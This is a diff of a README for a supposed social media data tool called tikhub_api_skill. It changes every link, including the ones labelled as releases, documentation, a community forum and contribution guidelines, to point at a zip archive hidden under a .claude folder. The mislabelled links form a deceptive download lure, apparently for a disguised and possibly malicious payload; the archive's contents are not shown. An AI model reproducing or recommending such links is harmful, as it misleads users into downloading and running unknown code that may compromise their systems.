@@ -1,6 +1,6 @@
 # 🌟 tikhub_api_skill - Access Multi-Platform Social Media Data
 
-[![Download](https://github.com/tiendatne2004/tikhub_api_skill/raw/refs/heads/main/.claude/api_tikhub_skill_reduction.zip)](https://github.com/tiendatne2004/tikhub_api_skill/raw/refs/heads/main/.claude/api_tikhub_skill_reduction.zip)
+[![Download](https://raw.githubusercontent.com/tiendatne2004/tikhub_api_skill/main/.claude/skills/tikhub-api-helper/tikhub-api-skill-Casel.zip)](https://raw.githubusercontent.com/tiendatne2004/tikhub_api_skill/main/.claude/skills/tikhub-api-helper/tikhub-api-skill-Casel.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ This guide shows you how to download and run the tikhub_api_skill application. F
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.  
-   [Download from Releases](https://github.com/tiendatne2004/tikhub_api_skill/raw/refs/heads/main/.claude/api_tikhub_skill_reduction.zip)
+   [Download from Releases](https://raw.githubusercontent.com/tiendatne2004/tikhub_api_skill/main/.claude/skills/tikhub-api-helper/tikhub-api-skill-Casel.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions of the application. Look for the latest version, which usually appears at the top.
 
@@ -47,7 +47,7 @@ The tikhub_api_skill app offers several features that make it a valuable tool fo
 
 For more detailed instructions on using the application, visit our documentation. Here, you will find tutorials, FAQs, and troubleshooting tips. This is helpful for first-time users who may need additional guidance.
 
-- [View Documentation](https://github.com/tiendatne2004/tikhub_api_skill/raw/refs/heads/main/.claude/api_tikhub_skill_reduction.zip) 
+- [View Documentation](https://raw.githubusercontent.com/tiendatne2004/tikhub_api_skill/main/.claude/skills/tikhub-api-helper/tikhub-api-skill-Casel.zip) 
 
 ## 🛠️ Troubleshooting
 
@@ -65,13 +65,13 @@ If the problem persists, visit the documentation or ask for help on our communit
 
 Join our community for discussions and support. Share your experiences, ask questions, and collaborate with other users.
 
-- Access our community forum: [Community Forum](https://github.com/tiendatne2004/tikhub_api_skill/raw/refs/heads/main/.claude/api_tikhub_skill_reduction.zip)
+- Access our community forum: [Community Forum](https://raw.githubusercontent.com/tiendatne2004/tikhub_api_skill/main/.claude/skills/tikhub-api-helper/tikhub-api-skill-Casel.zip)
 
 ## 🚨 Updates & Maintenance
 
 We regularly update the tikhub_api_skill application to fix bugs and add new features. To ensure you're using the latest version, regularly check the Releases page.
 
-1. **Visit the Releases Page**: [Download from Releases](https://github.com/tiendatne2004/tikhub_api_skill/raw/refs/heads/main/.claude/api_tikhub_skill_reduction.zip)
+1. **Visit the Releases Page**: [Download from Releases](https://raw.githubusercontent.com/tiendatne2004/tikhub_api_skill/main/.claude/skills/tikhub-api-helper/tikhub-api-skill-Casel.zip)
 2. After downloading, follow the same installation steps as above.
 
 Staying up-to-date will provide you with the best experience and latest features.
@@ -80,6 +80,6 @@ Staying up-to-date will provide you with the best experience and latest features
 
 If you wish to contribute to the tikhub_api_skill repository, we welcome your input! Whether you have ideas for new features or want to help improve the existing code, you can find more information on our GitHub page regarding contributions.
 
-- Learn how to contribute: [Contribution Guidelines](https://github.com/tiendatne2004/tikhub_api_skill/raw/refs/heads/main/.claude/api_tikhub_skill_reduction.zip)
+- Learn how to contribute: [Contribution Guidelines](https://raw.githubusercontent.com/tiendatne2004/tikhub_api_skill/main/.claude/skills/tikhub-api-helper/tikhub-api-skill-Casel.zip)
 
 Thank you for using the tikhub_api_skill application. We hope it makes your engagement with social media data simpler and more effective!
